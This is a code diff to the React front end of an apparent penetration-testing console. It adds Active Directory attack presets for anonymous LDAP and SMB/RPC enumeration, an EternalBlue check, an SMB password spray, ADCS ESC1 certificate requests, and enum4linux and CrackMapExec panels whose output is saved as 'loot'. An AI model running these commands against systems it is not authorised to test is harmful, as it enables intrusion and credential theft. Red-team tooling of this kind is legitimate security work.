@@ -604,6 +604,40 @@ const AD_GROUPS: ADGroup[] = [
       { label: 'Download results',       cmd: 'download C:\\\\Windows\\\\Temp\\\\bh_out.zip' },
     ],
   },
+  {
+    label: 'LDAP Enumeration',
+    cmds: [
+      { label: 'LDAP base query (anon)',  cmd: 'shell ldapsearch -x -H ldap://<IP> -b "" -s base namingContexts' },
+      { label: 'Enum users (anon)',       cmd: 'shell ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName' },
+      { label: 'Enum groups (anon)',      cmd: 'shell ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local" "(objectClass=group)" cn' },
+      { label: 'Enum computers (anon)',   cmd: 'shell ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local" "(objectClass=computer)" name' },
+      { label: 'MSF LDAP all objects',    cmd: 'use auxiliary/gather/ldap_query\nset ACTION ENUM_ALL_OBJECT_CATEGORY_COMPUTER\nrun' },
+      { label: 'MSF LDAP users',         cmd: 'use auxiliary/gather/ldap_query\nset ACTION ENUM_ACCOUNTS\nrun' },
+    ],
+  },
+  {
+    label: 'SMB / RPC Enumeration',
+    cmds: [
+      { label: 'Enum shares',             cmd: 'run auxiliary/scanner/smb/smb_enumshares' },
+      { label: 'Enum users via RPC',      cmd: 'run auxiliary/scanner/smb/smb_enumusers' },
+      { label: 'Check EternalBlue',       cmd: 'run auxiliary/scanner/smb/smb_ms17_010' },
+      { label: 'SMB password spray',      cmd: 'run auxiliary/scanner/smb/smb_login PASS_FILE=/usr/share/wordlists/fasttrack.txt' },
+      { label: 'enum4linux full sweep',   cmd: 'shell enum4linux -a <IP>' },
+      { label: 'enum4linux-ng full',      cmd: 'shell enum4linux-ng -A <IP>' },
+      { label: 'SMB null session test',   cmd: 'shell smbclient -N -L //<IP>' },
+      { label: 'RPC null session',        cmd: 'shell rpcclient -U "" -N <IP> -c "enumdomusers"' },
+    ],
+  },
+  {
+    label: 'Certificate Attacks (ADCS)',
+    cmds: [
+      { label: 'Enum ADCS templates',     cmd: 'run post/windows/gather/enum_adcs' },
+      { label: 'Check ADCS endpoint',     cmd: 'shell certutil -config - -ping' },
+      { label: 'List CA templates (shell)',cmd: 'shell certutil -catemplates' },
+      { label: 'MSF ESC1 cert request',   cmd: 'use auxiliary/admin/dcerpc/icpr_cert\nrun' },
+      { label: 'Enum CAs (MSF)',          cmd: 'use auxiliary/gather/ldap_query\nset ACTION ENUM_ALL_PKIENVELOPE\nrun' },
+    ],
+  },
 ];
 
 interface WordlistEntry { label: string; path: string; group: string }
@@ -623,6 +657,21 @@ function ActiveDirectoryPanel({ sessionId, targetHost }: { sessionId: number; ta
   const [kbRunning,     setKbRunning]     = useState(false);
   const [kbOutput,      setKbOutput]      = useState('');
   const [kbLootSaved,   setKbLootSaved]   = useState(false);
+
+  // Enum4linux state
+  const [e4lRunning,    setE4lRunning]    = useState(false);
+  const [e4lOutput,     setE4lOutput]     = useState('');
+  const [e4lSaved,      setE4lSaved]      = useState(false);
+
+  // CrackMapExec state
+  const [cmeProto,      setCmeProto]      = useState('smb');
+  const [cmeUser,       setCmeUser]       = useState('');
+  const [cmePass,       setCmePass]       = useState('');
+  const [cmeAction,     setCmeAction]     = useState('');
+  const [cmeRunning,    setCmeRunning]    = useState(false);
+  const [cmeOutput,     setCmeOutput]     = useState('');
+  const [cmeSaved,      setCmeSaved]      = useState(false);
+  const cmeInterval                       = useRef<ReturnType<typeof setInterval> | null>(null);
 
   // Load wordlists and domain from loot on mount
   useEffect(() => {
@@ -698,6 +747,51 @@ function ActiveDirectoryPanel({ sessionId, targetHost }: { sessionId: number; ta
     } finally {
       setRunning(false);
     }
+  };
+
+  const runEnum4Linux = async () => {
+    setE4lRunning(true); setE4lOutput(''); setE4lSaved(false);
+    try {
+      const res = await axios.post(`/api/sessions/${sessionId}/enum4linux`, {});
+      setE4lOutput(res.data.output || '(no output)');
+      setE4lSaved(res.data.saved === true);
+    } catch (err: any) {
+      setE4lOutput(err.response?.data?.error || err.message || 'Failed');
+    } finally {
+      setE4lRunning(false);
+    }
+  };
+
+  const pollCME = () => {
+    axios.get(`/api/sessions/${sessionId}/cme`)
+      .then(res => {
+        setCmeOutput(res.data.output || '');
+        setCmeSaved(res.data.saved === true);
+        if (res.data.done) {
+          setCmeRunning(false);
+          if (cmeInterval.current) { clearInterval(cmeInterval.current); cmeInterval.current = null; }
+        }
+      })
+      .catch(() => {});
+  };
+
+  const startCME = async () => {
+    setCmeRunning(true); setCmeOutput(''); setCmeSaved(false);
+    try {
+      await axios.post(`/api/sessions/${sessionId}/cme`, {
+        protocol: cmeProto, username: cmeUser, password: cmePass, action: cmeAction,
+      });
+      cmeInterval.current = setInterval(pollCME, 2000);
+    } catch (err: any) {
+      setCmeOutput(err.response?.data?.error || err.message || 'Failed');
+      setCmeRunning(false);
+    }
+  };
+
+  const stopCME = async () => {
+    await axios.delete(`/api/sessions/${sessionId}/cme`).catch(() => {});
+    if (cmeInterval.current) { clearInterval(cmeInterval.current); cmeInterval.current = null; }
+    setCmeRunning(false);
   };
 
   return (
@@ -784,6 +878,64 @@ function ActiveDirectoryPanel({ sessionId, targetHost }: { sessionId: number; ta
           <div className="ad-output-wrap" style={{ margin: '8px 0 0' }}>
             <div className="ad-output-label">{kbRunning ? 'Running…' : 'Kerbrute Output'}</div>
             <pre className="ad-output">{kbRunning ? '⌛ Running kerbrute…' : kbOutput}</pre>
+          </div>
+        )}
+      </div>
+
+      {/* ── Enum4Linux SMB enumeration ── */}
+      <div className="ad-kerbrute-section">
+        <div className="ad-kerbrute-header">SMB / RPC Enumeration (enum4linux)</div>
+        <div className="ad-kerbrute-row">
+          <button className="btn-run-scan" onClick={runEnum4Linux} disabled={e4lRunning}>
+            {e4lRunning ? 'Running…' : 'Run enum4linux-ng'}
+          </button>
+          <span className="ad-discovery-hint">enum4linux-ng -A {targetHost}</span>
+          {e4lSaved && <span className="ad-loot-saved">✓ Saved to Loot</span>}
+        </div>
+        {(e4lOutput || e4lRunning) && (
+          <div className="ad-output-wrap" style={{ marginTop: 8 }}>
+            <div className="ad-output-label">{e4lRunning ? 'Running…' : 'Output'}</div>
+            <pre className="ad-output">{e4lRunning ? '⌛ Running enum4linux…' : e4lOutput}</pre>
+          </div>
+        )}
+      </div>
+
+      {/* ── CrackMapExec ── */}
+      <div className="ad-kerbrute-section">
+        <div className="ad-kerbrute-header">CrackMapExec</div>
+        <div className="ad-kerbrute-row">
+          <label className="ad-kerbrute-label">Protocol</label>
+          <select className="ad-kerbrute-select" style={{ maxWidth: 100 }} value={cmeProto} onChange={e => setCmeProto(e.target.value)}>
+            {['smb','ldap','winrm','ssh','ftp'].map(p => <option key={p}>{p}</option>)}
+          </select>
+          <label className="ad-kerbrute-label" style={{ minWidth: 'auto' }}>Action</label>
+          <select className="ad-kerbrute-select" style={{ maxWidth: 130 }} value={cmeAction} onChange={e => setCmeAction(e.target.value)}>
+            <option value="">auth check</option>
+            <option value="shares">--shares</option>
+            <option value="users">--users</option>
+            <option value="groups">--groups</option>
+            <option value="sessions">--sessions</option>
+          </select>
+        </div>
+        <div className="ad-kerbrute-row">
+          <label className="ad-kerbrute-label">Username</label>
+          <input className="ad-kerbrute-input" value={cmeUser} onChange={e => setCmeUser(e.target.value)} placeholder="optional" spellCheck={false} />
+          <label className="ad-kerbrute-label" style={{ minWidth: 'auto' }}>Password</label>
+          <input className="ad-kerbrute-input" type="password" value={cmePass} onChange={e => setCmePass(e.target.value)} placeholder="optional" />
+        </div>
+        <div className="ad-kerbrute-row">
+          {cmeRunning ? (
+            <button className="btn-run-scan" onClick={stopCME}>Stop</button>
+          ) : (
+            <button className="btn-run-scan" onClick={startCME}>Run CME</button>
+          )}
+          <span className="ad-discovery-hint">crackmapexec {cmeProto} {targetHost} {cmeAction ? `--${cmeAction}` : ''}</span>
+          {cmeSaved && <span className="ad-loot-saved">✓ Saved to Loot</span>}
+        </div>
+        {(cmeOutput || cmeRunning) && (
+          <div className="ad-output-wrap" style={{ marginTop: 8 }}>
+            <div className="ad-output-label">{cmeRunning ? 'Running…' : 'Output'}</div>
+            <pre className="ad-output">{cmeRunning && !cmeOutput ? '⌛ Running crackmapexec…' : cmeOutput}</pre>
           </div>
         )}
       </div>
